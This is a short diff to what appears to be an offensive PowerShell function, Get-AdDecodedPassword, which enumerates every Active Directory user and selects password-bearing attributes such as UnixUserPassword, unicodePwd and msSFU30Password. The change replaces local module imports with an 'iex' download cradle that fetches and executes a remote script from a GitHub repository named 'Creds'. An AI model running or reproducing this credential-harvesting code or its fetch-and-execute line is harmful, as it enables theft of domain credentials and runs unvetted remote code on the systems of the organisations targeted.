@@ -27,8 +27,7 @@ Function Get-AdDecodedPassword
     Param()    
 
     # Import the AD PS module
-    Import-Module ActiveDirectory  
-    Import-Module .\Microsoft.ActiveDirectory.Management.dll            
+    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/ADModuleImport.ps1')           
     # Get domain users with populated UnixUserPassword properties
     Write-Verbose "Getting list of domain accounts and properties..."
     $EncodedUserPasswords = Get-AdUser -Filter * -Properties * | Select-Object samaccountname, description, UnixUserPassword, UserPassword, unicodePwd, msSFU30Name, msSFU30Password
